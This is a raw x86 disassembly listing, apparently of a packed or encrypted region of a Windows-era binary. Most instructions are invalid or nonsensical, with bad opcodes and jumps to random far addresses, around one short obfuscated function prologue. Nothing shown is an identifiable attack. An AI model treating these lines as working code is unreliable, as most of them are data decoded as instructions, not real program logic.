  409554:	cmp    DWORD PTR [edx],esi
  409556:	out    dx,al
  409557:	jmp    0xe7e4ae38
  40955c:	mov    esi,eax
  40955e:	mov    al,ds:0xec24f59a
  409563:	in     al,0x8a
  409565:	js     0x40950f
  409567:	out    0x45,eax
  409569:	ret    
  40956a:	mov    BYTE PTR [edx+edi*4],al
  40956d:	aad    0x0
  40956f:	in     eax,0x39
  409571:	ins    BYTE PTR es:[edi],dx
  409572:	test   DWORD PTR [ecx+0x2a],esp
  409575:	jmp    0xd617:0x11d057ff
  40957c:	xchg   ebp,eax
  40957d:	add    DWORD PTR [ebp+eax*8-0x4d185fb2],0xffffff99
  409585:	stos   DWORD PTR es:[edi],eax
  409586:	ins    BYTE PTR es:[edi],dx
  409587:	aad    0xef
  409589:	loop   0x40950d
  40958b:	fisub  WORD PTR [eax+0x6d]
  40958e:	or     ch,cl
  409590:	lods   eax,DWORD PTR ds:[esi]
  409591:	jmp    0x40951f
  409593:	clc    
  409594:	pop    esp
  409595:	cmp    ecx,esi
  409597:	rol    BYTE PTR ds:0xba82d172,0x18
  40959e:	pop    edx
  40959f:	data16 fiadd DWORD PTR [esi+ebp*2]
  4095a3:	jmp    0x409532
  4095a5:	cld    
  4095a6:	cmp    bh,BYTE PTR [ecx]
  4095a8:	aas    
  4095a9:	pop    ebp
  4095aa:	rol    ah,0xc6
  4095ad:	mov    ebx,0xccd3c8e1
  4095b2:	xchg   esi,eax
  4095b3:	stos   DWORD PTR es:[edi],eax
  4095b4:	arpl   WORD PTR [edx+0x76],bp
  4095b7:	dec    esi
  4095b8:	test   DWORD PTR ds:0x2a848473,ebx
  4095be:	xchg   edi,eax
  4095bf:	inc    DWORD PTR [ebp-0x2344b754]
  4095c5:	loop   0x409581
  4095c7:	xor    al,0x9e
  4095c9:	jle    0x40954f
  4095cb:	sub    cl,BYTE PTR [esp+eiz*2+0x7f]
  4095cf:	jp     0x409566
  4095d1:	sub    dh,BYTE PTR [edx+0x77d04e3b]
  4095d7:	das    
  4095d8:	push   edx
  4095d9:	out    0xf8,al
  4095db:	mov    dl,0x84
  4095dd:	add    al,0x31
  4095df:	adc    eax,0x1d388083
  4095e4:	loope  0x4095cc
  4095e6:	cmp    WORD PTR [edx-0x2adf17ab],cx
  4095ed:	(bad)  
  4095ee:	(bad)  
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8e79:0x809ce84e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	cld    
  40960d:	mov    ah,0x18
  40960f:	push   ds
  409610:	pushaw 
  409612:	jp     0x4095d0
  409614:	sub    bl,0xf
  409617:	nop
  409618:	das    
  409619:	aam    0x62
  40961b:	sbb    al,0x59
  40961d:	lods   al,BYTE PTR ds:[esi]
  40961e:	clc    
  40961f:	(bad)  
  409620:	and    eax,0x7864e234
  409625:	or     esp,DWORD PTR [ebx-0x4a]
  409628:	cmp    eax,0x7bb870c4
  40962d:	pop    ss
  40962e:	xor    bl,BYTE PTR [edi]
  409630:	(bad)  
  409631:	jmp    0x8a9b:0xe5c1e73a
  409638:	jne    0x40961e
  40963a:	jmp    DWORD PTR [ecx+esi*4]
  40963d:	ror    WORD PTR [ecx-0x62],1
  409641:	mov    bl,0xb7
  409643:	std    
  409644:	nop
  409645:	call   0xa1:0xd638a446
  40964c:	ja     0x409677
  40964e:	dec    edx
  40964f:	and    eax,0x48c26328
  409654:	push   ds
  409655:	sub    DWORD PTR [eax],esi
  409657:	je     0x409676
  409659:	cmp    ebx,DWORD PTR [edi-0x498c1e52]
  40965f:	in     al,dx
  409660:	push   esp
  409661:	aaa    
  409662:	push   es
  409663:	mov    dl,0x8a
  409665:	sbb    al,0x56
  409667:	mov    bh,0x5d
  409669:	mov    DWORD PTR [edi+0xe],ecx
  40966c:	mov    dl,0x2d
  40966e:	adc    BYTE PTR [ecx],0x85
  409671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409672:	scas   al,BYTE PTR es:[edi]
  409673:	cdq    
  409674:	scas   al,BYTE PTR es:[edi]
  409675:	sub    al,0x96
  409677:	mov    ah,0x2c
  409679:	loope  0x40960e
  40967b:	jo     0x40965e
  40967d:	push   0x34
  40967f:	scas   eax,DWORD PTR es:[edi]
  409680:	data16 cmc 
  409682:	mov    ebp,0x39249ef0
  409687:	je     0x4096f9
  409689:	cld    
  40968a:	or     al,0xb9
  40968c:	pop    ecx
  40968d:	cmp    BYTE PTR [ebx-0x67],ah
  409690:	popa   
  409691:	frstpm(287 only) 
  409693:	loope  0x409657
  409695:	or     DWORD PTR [ebp+0x4a5e7c5b],ebp
  40969b:	ins    BYTE PTR es:[edi],dx
  40969c:	into   
  40969d:	rcl    BYTE PTR [eax-0x68d04352],1
  4096a3:	inc    ebp
  4096a4:	je     0x4096ce
  4096a6:	sub    al,0x69
  4096a8:	xchg   ecx,eax
  4096a9:	jb     0x409706
  4096ab:	ins    DWORD PTR es:[edi],dx
  4096ac:	das    
  4096ad:	push   cs
  4096ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096af:	(bad)  
  4096b0:	pushf  
  4096b1:	in     al,0xa6
  4096b3:	sub    eax,0xbfadb7b2
  4096b8:	cmp    DWORD PTR [eax-0x2e],ecx
  4096bb:	push   eax
  4096bc:	xchg   edx,eax
  4096bd:	push   ebp
  4096be:	call   0x5f3f:0x26d35eaa
  4096c5:	sahf   
  4096c6:	fist   WORD PTR ds:0x929787e6
  4096cc:	push   esi
  4096cd:	mov    dl,0x6f
  4096cf:	js     0x409691
  4096d1:	jle    0x409674
  4096d3:	fcom   DWORD PTR [edx]
  4096d5:	inc    ebp
  4096d6:	pop    es
  4096d7:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4096d9:	retf   
  4096da:	lahf   
  4096db:	scas   al,BYTE PTR es:[edi]
  4096dc:	call   0xb9cd:0xea0ac401
  4096e3:	(bad)  
  4096e5:	addr16 jns 0x4096df
  4096e8:	add    ebp,esi
  4096ea:	push   ecx
  4096eb:	ins    DWORD PTR es:[edi],dx
  4096ec:	sub    ecx,DWORD PTR [edi+eax*8-0x5f1a2f2f]
  4096f3:	call   FWORD PTR [esi]
  4096f5:	jns    0x40976e
  4096f7:	pusha  
  4096f8:	imul   edi,DWORD PTR [ebx-0x1f3358fe],0x7b
  4096ff:	hlt    
  409700:	and    eax,0x4cbf3b83
  409705:	xchg   ebx,eax
  409706:	adc    BYTE PTR [edi-0x4a4b2cc],dl
  40970c:	sub    DWORD PTR [ebp+edi*4+0x7c],eax
  409710:	out    0x36,eax
  409712:	xchg   DWORD PTR [eax-0x5],ebx
  409715:	sub    BYTE PTR [esi-0x42],bh
  409718:	xor    DWORD PTR [edi],ebx
  40971a:	push   edx
  40971b:	outs   dx,BYTE PTR ds:[esi]
  40971c:	jmp    0x409724
  40971e:	mov    esi,0x24ad5de2
  409723:	sbb    BYTE PTR [eax+0x7c4229d3],al
  409729:	and    BYTE PTR [esi+0x15],al
  40972c:	imul   ebx,DWORD PTR [edx-0x3a],0xac3cda3
  409733:	jne    0x409762
  409735:	inc    edx
  409736:	cld    
  409737:	rcl    DWORD PTR [edi-0x46],1
  40973a:	xchg   ebx,eax
  40973b:	xchg   ecx,eax
  40973c:	or     eax,0xff57c13e
  409741:	enter  0x428b,0x17
  409745:	sub    DWORD PTR [esi-0x3991db21],0xffffffa7
  40974c:	clc    
  40974d:	jmp    0xb80b:0xda6e0b7c
  409754:	psubusb mm2,QWORD PTR [ebx+0x3fe44fb1]
  40975b:	and    al,0xce
  40975d:	lds    ebp,FWORD PTR [ebx+0x2718fcd9]
  409763:	mov    dl,0x97
  409765:	xchg   DWORD PTR [ebx],ebp
  409767:	call   0x8592:0xd387a938
  40976e:	sbb    ebx,DWORD PTR [ecx+0x18]
  409771:	push   ecx
  409772:	xchg   ecx,eax
  409774:	push   esp
  409775:	fild   DWORD PTR [ebp+0x3b]
  409778:	xor    dl,BYTE PTR [edx]
  40977a:	(bad)  
  40977b:	jmp    0x4097ab
  40977d:	cmp    al,0xaa
  40977f:	dec    esp
  409780:	fcomp  QWORD PTR [ecx+0x62]
  409783:	pusha  
  409784:	xlat   BYTE PTR ds:[ebx]
  409785:	popf   
  409786:	push   ds
  409787:	ins    BYTE PTR es:[edi],dx
  409788:	(bad)  [ecx]
  40978a:	xchg   ebp,eax
  40978b:	push   es
  40978c:	hlt    
  40978d:	inc    edi
  40978e:	(bad)  
  40978f:	aaa    
  409790:	test   BYTE PTR [eax+0x12],bh
  409793:	cmp    BYTE PTR ds:0x19e9313b,ch
  409799:	outs   dx,DWORD PTR ds:[esi]
  40979a:	mov    bh,BYTE PTR [eax]
  40979c:	test   eax,0x5179c8ed
  4097a1:	sbb    edx,DWORD PTR [esi+0x6b71971c]
  4097a7:	lock sahf 
  4097a9:	fidiv  DWORD PTR [esi-0x78269cf5]
  4097af:	mov    BYTE PTR [ebx],ah
  4097b1:	data16 scas al,BYTE PTR es:[edi]
  4097b3:	and    esp,edi
  4097b5:	push   ecx
  4097b6:	sub    cl,dh
  4097b8:	cmp    BYTE PTR [esi-0x5f93f428],cl
  4097be:	mov    al,ds:0x24890435
  4097c3:	js     0x409821
  4097c5:	fadd   QWORD PTR [ebp-0x6a]
  4097c8:	mov    esi,0x13389858
  4097cd:	jecxz  0x409778
  4097cf:	pop    edi
  4097d0:	jo     0x4097fc
  4097d2:	adc    DWORD PTR [eax+0x36],esi
  4097d5:	call   0xee5597ac
  4097da:	inc    ecx
  4097db:	ja     0x409794
  4097dd:	sub    al,0x2b
  4097df:	retf   0xb89c
  4097e2:	ret    0xb976
  4097e5:	je     0x409799
  4097e7:	out    0xc3,al
  4097e9:	mov    al,ds:0x2c75d677
  4097ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097ef:	inc    eax
  4097f0:	and    DWORD PTR [ecx],ecx
  4097f2:	retf   0xb041
  4097f5:	mov    eax,0x8adc5bd1
  4097fa:	lock jmp 0x5340:0x725c28dd
  409802:	aas    
  409803:	push   0xffffffed
  409805:	jbe    0x409854
  409807:	test   cl,dh
  409809:	out    0xe7,al
  40980b:	fld    QWORD PTR [ebx+0xf7b8b17]
  409811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409812:	jg     0x409873
  409814:	inc    bl
  409816:	setge  BYTE PTR [ecx]
  409819:	(bad)  
  40981b:	in     eax,0x94
  40981d:	mov    dh,0x3d
  40981f:	dec    ebx
  409820:	aam    0x93
  409822:	xor    edi,0xd9469ada
  409828:	jg     0x4097ab
  40982a:	js     0x40986d
  40982c:	pushf  
  40982d:	scas   al,BYTE PTR es:[edi]
  40982e:	cmp    DWORD PTR [ebp-0x63],esp
  409831:	retf   
  409832:	fiadd  DWORD PTR [edx+0x458bb24e]
  409838:	hlt    
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x4336df
  40986f:	xor    DWORD PTR ds:0x433617,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x4336db,0x4336ab
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x433667,0x433713
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x4335fb
  4098a6:	sub    DWORD PTR ds:0x4336df,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	mov    edx,?
  4098c2:	push   ecx
  4098c3:	xor    esi,DWORD PTR [ecx+ebx*8+0x7c387e7e]
  4098ca:	jle    0x40994a
  4098cc:	mov    al,ds:0xd8e05684
  4098d1:	or     al,BYTE PTR [eax+eiz*1+0x5765bc78]
  4098d8:	cld    
  4098d9:	mov    ebp,0x9a0fddc8
  4098de:	mov    ebp,0x9c13b0e9
  4098e3:	sar    BYTE PTR [eax-0x6f4fdb1d],cl
  4098e9:	mov    ebx,0x33aae740
  4098ee:	inc    edx
  4098ef:	stos   DWORD PTR es:[edi],eax
  4098f0:	pusha  
  4098f1:	dec    ecx
  4098f2:	int3   
  4098f3:	(bad)  
  4098f4:	adc    eax,0xdf4d9f15
  4098f9:	fild   DWORD PTR [ecx+0x2def8ade]
  4098ff:	mov    ah,0xfd
  409901:	(bad)  
  409903:	ror    cl,1
  409905:	pushf  
  409906:	out    0x9d,al
  409908:	ret    0x9d12
  40990b:	fld    QWORD PTR [ecx]
  40990d:	adc    DWORD PTR fs:[ebp+0x24],esp
  409911:	xchg   bh,cl
  409913:	xlat   BYTE PTR ds:[ebx]
  409914:	loope  0x4098bf
  409916:	in     al,dx
  409917:	retf   0xe822
  40991a:	ins    DWORD PTR es:[edi],dx
  40991b:	popa   
  40991c:	dec    eax
  40991d:	dec    edx
  40991e:	in     eax,0x1d
  409920:	lea    eax,[eax-0xf]
  409923:	out    dx,eax
  409924:	sbb    eax,0xf740fa72
  409929:	xchg   BYTE PTR [edi+0x1632550b],dh
  40992f:	lds    edi,FWORD PTR [ebx]
  409931:	xor    bh,cl
  409933:	push   esi
  409934:	jne    0x40990b
  409936:	loop   0x4098ea
  409938:	push   eax
  409939:	jmp    0x3d8cc824
  40993e:	inc    esp
  40993f:	inc    ecx
  409940:	js     0x409991
  409942:	mov    eax,0x8ec199d8
  409947:	xlat   BYTE PTR ds:[ebx]
  409948:	cmp    al,0xd6
  40994a:	dec    edx
  40994b:	imul   edx,DWORD PTR [ebx],0xffffff83
  40994e:	(bad)  
  409950:	(bad)  
  409951:	hlt    
  409952:	test   BYTE PTR [edx-0x7c35c767],bl
  409958:	dec    edi
  409959:	std    
  40995a:	sar    BYTE PTR [ebx],1
  40995c:	mov    cl,0xfa
  40995e:	mov    cl,BYTE PTR [ecx-0x4f7a0e17]
  409964:	ds add eax,0x2cf0fa6f
  40996a:	pop    ebx
  40996b:	lods   eax,DWORD PTR ds:[esi]
  40996c:	pop    esi
  40996d:	out    dx,al
  40996e:	inc    esi
  40996f:	push   0x72ca4807
  409974:	pop    ss
  409975:	popf   
  409976:	bound  ecx,QWORD PTR [eax-0x2f]
  409979:	sbb    al,0x6e
  40997b:	add    ah,dh
  40997d:	loop   0x4099df
  40997f:	test   DWORD PTR ds:0x6f20e35,ebx
  409985:	popf   
  409986:	cwde   
  409987:	mov    ebp,0x4e2572cd
  40998c:	sbb    al,0xbc
  40998e:	imul   eax,DWORD PTR [ecx+ebx*8+0x23],0x366c0cd0
  409996:	adc    BYTE PTR [eax+0x558e0a27],dh
  40999c:	cld    
  40999d:	push   0x1687b6ea
  4099a2:	or     BYTE PTR [ecx],dl
  4099a4:	test   al,0xb0
  4099a6:	jno    0x4099e7
  4099a8:	enter  0x9026,0xdc
  4099ac:	jg     0x409995
  4099ae:	loop   0x409a0b
  4099b0:	push   edx
  4099b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099b2:	retf   
  4099b3:	sub    BYTE PTR [eax+0x4d32ad68],bh
  4099b9:	pop    es
  4099ba:	pushf  
  4099bb:	adc    ebp,esi
  4099bd:	inc    ebx
  4099be:	test   eax,0x37a8f5ee
  4099c3:	stc    
  4099c4:	(bad)  
  4099c5:	mov    dl,0x9d
  4099c7:	xchg   esi,esi
  4099c9:	push   0x5d
  4099cb:	cmp    bh,BYTE PTR [ebx+0x22]
  4099ce:	lea    esi,[esi+edi*8]
  4099d1:	jo     0x40996a
  4099d3:	retf   0x839
  4099d6:	stos   BYTE PTR es:[edi],al
  4099d7:	jmp    0x506c58e8
  4099dc:	sub    ah,bl
  4099de:	enter  0x1f84,0x91
  4099e2:	outs   dx,BYTE PTR ds:[esi]
  4099e3:	add    BYTE PTR [ebp+edi*1+0x9350195],bh
  4099ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099eb:	push   ds
  4099ec:	xchg   ebx,eax
  4099ed:	mov    edx,0xc6005159
  4099f2:	inc    esi
  4099f3:	shl    BYTE PTR [esi],1
  4099f5:	test   al,cl
  4099f7:	mov    ds:0xb4fc1024,al
  4099fc:	inc    esp
  4099fd:	inc    esi
  4099fe:	pusha  
  4099ff:	jno    0x409a7f
  409a01:	out    dx,eax
  409a02:	cmp    DWORD PTR [ecx+0x43539013],esi
  409a08:	int    0x2a
  409a0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a0b:	push   ebp
  409a0c:	mov    ecx,0x99537f97
  409a11:	pop    edx
  409a12:	xchg   edi,eax
  409a13:	push   cs
  409a14:	fwait
  409a15:	cmp    eax,0xbffa47b4
  409a1a:	sti    
  409a1b:	(bad)  
  409a1d:	push   ecx
  409a1e:	icebp  
  409a1f:	daa    
  409a20:	xlat   BYTE PTR ds:[ebx]
  409a21:	test   BYTE PTR [edi+0x18636bc0],cl
  409a27:	mov    al,0xaa
  409a29:	push   ss
  409a2a:	lahf   
  409a2b:	and    al,0x37
  409a2d:	ret    0xf823
  409a30:	nop
  409a31:	bound  ebp,QWORD PTR [ebx+edx*8-0x7b]
  409a35:	les    esp,FWORD PTR [edx-0x1d]
  409a38:	ss call 0xe97d7423
  409a3e:	sub    DWORD PTR [edx+0x3660e1dc],edi
  409a44:	enter  0x4dd4,0x4f
  409a48:	pop    esp
  409a49:	mov    eax,0x8d34bbd5
  409a4e:	lea    esi,[edx]
  409a50:	pushf  
  409a51:	(bad)  
  409a52:	jmp    0x409a0c
  409a54:	sti    
  409a55:	fnstenv [ecx-0xdd3cd52]
  409a5b:	fist   WORD PTR [edi]
  409a5d:	mov    ds,WORD PTR [ecx-0x78]
  409a60:	pop    ebp
  409a61:	jl     0x409a16
  409a63:	pop    ss
  409a64:	cmp    ch,dl
  409a66:	shl    BYTE PTR [edi-0x71e7fbc4],0xef
  409a6d:	stc    
  409a6e:	cmp    eax,0xcf54988f
  409a73:	stos   BYTE PTR es:[edi],al
  409a74:	jge    0x409a1d
  409a76:	call   0x459722a2
  409a7b:	jge    0x409a42
  409a7d:	inc    ecx
  409a7e:	sub    bl,BYTE PTR [ecx]
  409a80:	or     eax,0xe7917b99
  409a85:	loope  0x409ad6
  409a87:	out    dx,eax
  409a88:	cmp    BYTE PTR [esi+0x1365016e],0xd2
  409a8f:	mov    bl,0x8d
  409a91:	inc    esp
  409a92:	jne    0x409aec
  409a94:	mov    dl,0xa4
  409a96:	sub    al,0x7b
  409a98:	enter  0x2cd0,0x28
  409a9c:	stos   BYTE PTR es:[edi],al
  409a9d:	xor    eax,0x715878be
  409aa2:	hlt    
  409aa3:	in     al,0xda
  409aa5:	cmp    al,BYTE PTR [eax]
  409aa7:	inc    eax
  409aa8:	aaa    
  409aa9:	inc    edx
  409aaa:	or     al,0xf5
  409aac:	mov    bl,0x2
  409aae:	int3   
  409aaf:	adc    ah,ch
  409ab1:	mov    esp,0xcfea19da
  409ab6:	aam    0x21
  409ab8:	stos   DWORD PTR es:[edi],eax
  409ab9:	add    DWORD PTR [ebx],edx
  409abb:	clc    
  409abc:	mov    edi,0x5f0139d5
  409ac1:	push   ecx
  409ac2:	ss mov esi,0xe996afb2
  409ac8:	xor    al,0x2b
  409aca:	pop    esi
  409acb:	inc    ebp
  409acc:	imul   ebp,DWORD PTR [ebx],0x266d98e5
  409ad2:	seto   BYTE PTR [ebx+0x6d]
  409ad6:	fld    DWORD PTR [esi]
  409ad8:	xchg   BYTE PTR [edx-0x5f],al
  409adb:	rcl    DWORD PTR [esi+edi*4+0x56],1
  409adf:	cmp    bl,dh
  409ae1:	xor    al,0x6c
  409ae3:	sub    bl,BYTE PTR [ebp-0x15e479e6]
  409ae9:	cli    
  409aea:	mov    ch,0x52
  409aec:	pop    ecx
  409aed:	lahf   
  409aee:	push   ss
  409aef:	xor    bl,BYTE PTR [edi-0x73]
  409af2:	fidiv  WORD PTR [ebx]
  409af4:	dec    ecx
  409af5:	mov    ebx,0x74dff7e0
  409afa:	xchg   DWORD PTR [ebx+edi*1],edi
  409afd:	out    dx,eax
  409afe:	jle    0x409b06
  409b00:	daa    
  409b01:	mov    cl,BYTE PTR [eax]
  409b03:	dec    ecx
  409b04:	retf   0x25a8
  409b07:	dec    ebx
  409b08:	inc    esp
  409b09:	mov    ?,esp
  409b0b:	retf   0x5077
  409b0e:	cdq    
  409b0f:	sbb    eax,DWORD PTR [eax-0x7ea8a9ba]
  409b15:	sbb    eax,0x43369f
  409b1a:	push   ebx
  409b1b:	ss inc ebx
  409b1d:	add    cl,ch
  409b1f:	pop    esi
  409b20:	add    al,BYTE PTR [eax]
  409b22:	add    ch,al
  409b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b25:	lods   al,BYTE PTR ds:[esi]
  409b26:	shr    BYTE PTR [ecx+edx*8+0x61],cl
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi+0x26dfa8d4]
  409b32:	sar    BYTE PTR [esi-0x1c],0x7e
  409b36:	jle    0x409b70
  409b38:	jl     0x409bb8
  409b3a:	jle    0x409af2
  409b3c:	xor    dl,cl
  409b3e:	(bad)  
  409b40:	xchg   ebx,eax
  409b41:	and    DWORD PTR [eax+edx*2-0x6d67aa5e],ebp
  409b48:	dec    ebp
  409b49:	loop   0x409b6f
  409b4b:	or     bl,bh
  409b4d:	xor    cl,ch
  409b4f:	into   
  409b50:	add    BYTE PTR [ebp+0x3e817bf2],ah
  409b56:	shr    BYTE PTR ds:0x8e66771e,0xd
  409b5d:	xchg   edx,esi
  409b5f:	jns    0x409be0
  409b61:	push   eax
  409b62:	sub    eax,0x7d2f4683
  409b67:	jge    0x409b28
  409b69:	adc    DWORD PTR [ebx],0xffffffd2
  409b6c:	dec    ebp
  409b6d:	call   0x5248:0x1660307a
  409b74:	mov    eax,0x7ce5ec3b
  409b79:	push   ss
  409b7a:	and    al,0xb3
  409b7c:	jge    0x409bef
  409b7e:	stos   WORD PTR es:[edi],ax
  409b80:	or     al,0xc
  409b82:	add    BYTE PTR [ecx],al
  409b84:	pop    es
  409b85:	cdq    
  409b86:	dec    ebp
  409b87:	test   BYTE PTR [edi+0x72],0xea
  409b8b:	xor    eax,0x590c4a07
  409b90:	xchg   esi,eax
  409b91:	dec    esi
  409b92:	mov    al,0xcb
  409b94:	fld    TBYTE PTR [esp+ecx*8]
  409b97:	push   es
  409b98:	jns    0x409b58
  409b9a:	out    0xe7,al
  409b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b9d:	sub    eax,0xd458769
  409ba2:	push   ecx
  409ba3:	sub    al,0x9d
  409ba5:	pushf  
  409ba6:	xchg   DWORD PTR [eax+0x1d95458e],edi
  409bac:	inc    esp
  409bad:	loope  0x409bfe
  409baf:	nop
  409bb0:	sti    
  409bb1:	add    esi,DWORD PTR [ebx+0x363acf7c]
  409bb7:	jecxz  0x409b8a
  409bb9:	fcomp  DWORD PTR [edi-0x8bb7156]
  409bbf:	xor    DWORD PTR [ebp+0x22],esp
  409bc2:	ins    BYTE PTR es:[edi],dx
  409bc3:	fs cwde 
  409bc5:	popa   
  409bc6:	call   FWORD PTR [ecx-0x30]
  409bc9:	mov    DWORD PTR [ecx-0x5c],eax
  409bcc:	sbb    edx,DWORD PTR [ecx]
  409bce:	ins    BYTE PTR es:[edi],dx
  409bcf:	inc    edx
  409bd0:	xor    ebp,DWORD PTR [ebx+0x25]
  409bd3:	aad    0x37
  409bd5:	rcr    BYTE PTR [esi+0x78],0xf3
  409bd9:	test   DWORD PTR [edx+0x62],edi
  409bdc:	pop    esp
  409bdd:	mov    ah,BYTE PTR [edi-0x257c2a15]
  409be3:	dec    ecx
  409be4:	dec    eax
  409be5:	test   BYTE PTR [ebx+0x57],0x1a
  409be9:	push   ecx
  409bea:	shr    DWORD PTR [eax-0x76],1
  409bed:	jg     0x409c0c
  409bef:	lock xchg edx,eax
  409bf1:	mov    ds:0x56e6d567,eax
  409bf6:	mov    ds:0x21c85b2a,eax
  409bfb:	cs sbb ebp,eax
  409bfe:	mov    edx,0x37dc8015
  409c03:	stos   BYTE PTR es:[edi],al
  409c04:	daa    
  409c05:	mov    al,ds:0x7628e85c
  409c0a:	ficom  WORD PTR [edx+0x67]
  409c0d:	lods   eax,DWORD PTR ds:[esi]
  409c0e:	std    
  409c0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c10:	sar    DWORD PTR [esi-0x5d],1
  409c13:	inc    ecx
  409c14:	hlt    
  409c15:	mov    ecx,0xb05b1250
  409c1a:	jne    0x409bfa
  409c1c:	adc    cl,ah
  409c1e:	jecxz  0x409c65
  409c20:	add    cl,bh
  409c22:	in     eax,dx
  409c23:	sar    DWORD PTR es:[eax-0x2],0x5d
  409c28:	or     eax,0xd8fed54f
  409c2d:	lods   eax,DWORD PTR ds:[esi]
  409c2e:	jp     0x409bc4
  409c30:	and    bl,bl
  409c32:	adc    BYTE PTR [esi-0x32],bh
  409c35:	psrlw  mm5,QWORD PTR [ebx-0x4838de5]
  409c3c:	repz lock mov ebp,0xce065b40
  409c43:	pop    ds
  409c44:	cs or  eax,0x3659ce09
  409c4a:	jg     0x409bfd
  409c4c:	push   0xa540725f
  409c51:	push   esi
  409c52:	out    dx,eax
  409c53:	call   0x2d73:0xfc027a3d
  409c5a:	test   BYTE PTR [edi-0x2f8c9fa8],cl
  409c60:	mov    eax,0x23ecf9e4
  409c65:	add    al,dl
  409c67:	rol    DWORD PTR [ebx],1
  409c69:	pop    ds
  409c6a:	inc    ebp
  409c6b:	ds test eax,0x50ceb423
  409c71:	fdiv   QWORD PTR [ecx]
  409c73:	bndstx [ebx-0x5be7bb73],bnd0
  409c7a:	out    dx,al
  409c7b:	cld    
  409c7c:	scas   al,BYTE PTR es:[edi]
  409c7d:	fwait
  409c7e:	sub    ah,BYTE PTR [esi]
  409c80:	mov    ebx,0x59d387a9
  409c85:	rol    DWORD PTR [ecx],cl
  409c87:	inc    ecx
  409c88:	(bad)  
  409c8a:	scas   al,BYTE PTR es:[edi]
  409c8b:	jnp    0x409c39
  409c8d:	ret    
  409c8e:	mov    bh,0x7
  409c90:	inc    esp
  409c91:	pop    eax
  409c92:	shl    BYTE PTR [edx+0x254c221],1
  409c98:	pusha  
  409c99:	cmp    bh,BYTE PTR [ebx]
  409c9b:	push   0x6
  409c9d:	jge    0x409c99
  409c9f:	test   bh,bl
  409ca1:	neg    DWORD PTR [ecx+0x3558d462]
  409ca7:	lods   al,BYTE PTR ds:[esi]
  409ca8:	mov    bh,0xd2
  409caa:	stos   DWORD PTR es:[edi],eax
  409cab:	add    al,0x53
  409cad:	not    BYTE PTR [esp+esi*4+0x861de70]
  409cb4:	push   ss
  409cb5:	fcom   st(3)
  409cb7:	daa    
  409cb8:	or     al,0xa0
  409cba:	pop    ebp
  409cbb:	sub    BYTE PTR [ecx-0x7d],0x59
  409cbf:	or     eax,0xc5c9db0e
  409cc4:	fisttp QWORD PTR [ecx]
  409cc6:	lock iret 
  409cc8:	iret   
  409cc9:	push   esp
  409cca:	xchg   ebx,eax
  409ccb:	aas    
  409ccc:	mov    al,ds:0x2ec53881
  409cd1:	pop    eax
  409cd2:	inc    ecx
  409cd3:	mov    ebx,0xb31b704a
  409cd8:	cmp    BYTE PTR [esp+eiz*2],0x14
  409cdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cdd:	adc    BYTE PTR [ebx+0x771758cb],cl
  409ce3:	or     dl,al
  409ce5:	push   ds
  409ce6:	add    eax,0x9867d07c
  409ceb:	mov    DWORD PTR [edi+ebx*1],ebp
  409cee:	pop    ebp
  409cef:	in     al,0xad
  409cf1:	xor    al,0xee
  409cf3:	add    al,0x34
  409cf5:	inc    edi
  409cf6:	adc    eax,0x45baf5e5
  409cfb:	scas   eax,DWORD PTR es:[edi]
  409cfc:	add    eax,0x291b2502
  409d01:	fadd   st(1),st
  409d03:	xor    al,0x8f
  409d05:	mov    ah,0xd6
  409d07:	shr    esp,1
  409d09:	popf   
  409d0a:	out    0x62,eax
  409d0c:	inc    esi
  409d0d:	data16 jo 0x409cf8
  409d10:	mov    eax,0x82e30781
  409d15:	mov    edi,0x52294c23
  409d1a:	lock lods eax,DWORD PTR ds:[esi]
  409d1c:	and    ecx,DWORD PTR [edx+0x19]
  409d1f:	sbb    ch,BYTE PTR [esp+ecx*4-0x3d21c0d7]
  409d26:	cmp    al,0xa7
  409d28:	mov    eax,0x4abac3a9
  409d2d:	outs   dx,DWORD PTR ds:[esi]
  409d2e:	arpl   dx,dx
  409d30:	inc    esp
  409d31:	das    
  409d32:	push   cs
  409d33:	ds dec esi
  409d35:	in     al,0x2d
  409d37:	pop    eax
  409d38:	lock (bad) 
  409d3a:	xchg   esp,eax
  409d3b:	jb     0x409da2
  409d3d:	mov    ecx,0x602d3d44
  409d42:	(bad)  
